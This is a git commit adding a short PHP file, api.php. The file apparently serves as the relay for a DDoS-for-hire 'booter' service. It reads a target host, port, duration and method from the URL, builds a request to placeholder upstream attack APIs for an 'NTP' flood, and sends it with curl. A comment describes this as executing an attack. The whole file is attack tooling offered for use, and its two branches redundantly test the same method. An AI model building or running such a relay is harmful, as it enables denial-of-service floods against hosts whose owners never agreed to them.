1385ae4371a5f06b7f1caeb49f3b95dbde3f0ae0
ɄŁ₮₹₳ <97373050+ub2022@users.noreply.github.com>
2022-01-27 20:34:22 -0500

    api.php

---
+++ api.php
@@ -0,0 +1,31 @@
+<?php
+
+//get variables
+$host = $_GET['host'];
+$port = intval($_GET['port']);
+$time = intval($_GET['time']);
+$method = $_GET['method'];
+
+//methods/urls here
+  if($method == "NTP"){
+			       $apiurl = 'https://website.com/api.php?host='.$host.'&port='.$port.'&time='.$time.'&method=NTP';
+			    }
+               
+               if($method == "NTP"){
+			       $apiurl = 'https://website2.com/api.php?host='.$host.'&port='.$port.'&time='.$time.'&method=NTP';
+			    }
+
+//execute attack using curl
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $apiurl);
+curl_setopt($ch, CURLOPT_HEADER, false);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
+curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
+$data = curl_exec($ch);
+curl_close($ch);
+
+//echo results
+echo $data;
+
+?>
